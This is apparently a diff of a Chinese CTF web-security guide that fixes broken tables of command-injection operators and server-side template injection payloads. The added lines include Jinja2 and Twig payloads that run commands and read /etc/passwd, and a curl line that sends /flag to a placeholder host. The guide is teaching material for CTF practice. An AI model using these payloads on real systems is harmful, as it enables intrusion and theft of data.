@@ -32,7 +32,7 @@
   <meta itemprop="description" content="持续更新的CTF Web知识体系与刷题总结。">
   <meta itemprop="datePublished" content="2025-12-22T22:43:35+08:00">
   <meta itemprop="dateModified" content="2025-12-22T22:43:35+08:00">
-  <meta itemprop="wordCount" content="11409">
+  <meta itemprop="wordCount" content="11430">
   <meta itemprop="image" content="https://decimo.top/images/1.png">
   <meta itemprop="keywords" content="Guide">
   <meta property="og:image:alt" content="[持续更新] CTF-Web Guide" />
@@ -1546,18 +1546,18 @@ decimo的小窝
           <td style="text-align: left">避免报错暴露，更隐蔽</td>
       </tr>
       <tr>
-          <td style="text-align: left">`</td>
-          <td style="text-align: left">`</td>
+          <td style="text-align: left"><code>|</code></td>
           <td style="text-align: left">管道符</td>
           <td style="text-align: left">前面输出作为后面的<strong>输入</strong></td>
-          <td style="text-align: left">`cat /flag</td>
+          <td style="text-align: left"><code>cat /flag | base64</code></td>
+          <td style="text-align: left">数据处理（编码/过滤）</td>
       </tr>
       <tr>
-          <td style="text-align: left">`</td>
-          <td style="text-align: left"></td>
-          <td style="text-align: left">`</td>
+          <td style="text-align: left"><code>||</code></td>
           <td style="text-align: left">逻辑或</td>
           <td style="text-align: left"><strong>前面失败(返回非0)才执行后面</strong></td>
+          <td style="text-align: left"><code>ping xxx || whoami</code></td>
+          <td style="text-align: left">前面命令不存在时触发</td>
       </tr>
   </tbody>
 </table>
@@ -1763,9 +1763,9 @@ decimo的小窝
           <td style="text-align: left"><code>ping 127.0.0.1%0awhoami</code></td>
       </tr>
       <tr>
-          <td style="text-align: left">**管道符 `</td>
-          <td style="text-align: left">` 被过滤**</td>
-          <td style="text-align: left">用 `</td>
+          <td style="text-align: left"><strong>管道符 <code>|</code> 被过滤</strong></td>
+          <td style="text-align: left">用 <code>||</code> 或 <code>&amp;&amp;</code></td>
+          <td style="text-align: left"><code>ping 127.0.0.1 &amp;&amp; whoami</code></td>
       </tr>
   </tbody>
 </table>
@@ -2521,7 +2521,7 @@ decimo的小窝
       </tr>
       <tr>
           <td style="text-align: left"><strong>HTTP 外带</strong></td>
-          <td style="text-align: left">`{% print(lipsum.<strong>globals</strong>.os.popen(&lsquo;curl http://your-ip/$(cat /flag</td>
+          <td style="text-align: left"><code>{% print(lipsum.__globals__.os.popen('curl http://your-ip/$(cat /flag | base64)').read()) %}</code></td>
       </tr>
       <tr>
           <td style="text-align: left"><strong>DNS 外带</strong></td>
@@ -2575,7 +2575,7 @@ decimo的小窝
       <tr>
           <td style="text-align: left"><strong>Twig</strong></td>
           <td style="text-align: left"><code>{{7*7}}</code> → 49、<code>{{7*'7'}}</code> → 49</td>
-          <td style="text-align: left">`{{[&lsquo;id&rsquo;]</td>
+          <td style="text-align: left"><code>{{['id']|filter('system')}}</code>（Twig 2.x/3.x）<br><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}</code>（Twig 1.x）<br><code>{{['cat /flag']|map('system')|join}}</code><br><code>{{'/etc/passwd'|file_excerpt(1,30)}}</code>（读文件）</td>
       </tr>
       <tr>
           <td style="text-align: left"><strong>Smarty</strong></td>
@@ -6165,7 +6165,7 @@ decimo的小窝
       </tr>
       <tr>
           <td style="text-align: left"><strong><code>child_process.exec</code> 命令注入</strong></td>
-          <td style="text-align: left"><code>exec</code> 会走 <code>/bin/sh</code>，所以 <code>;</code>、`</td>
+          <td style="text-align: left"><code>exec</code> 会走 <code>/bin/sh</code>，所以 <code>;</code>、<code>|</code>、<code>$()</code> 都能用</td>
       </tr>
       <tr>
           <td style="text-align: left"><strong><code>require</code> 路径穿越</strong></td>
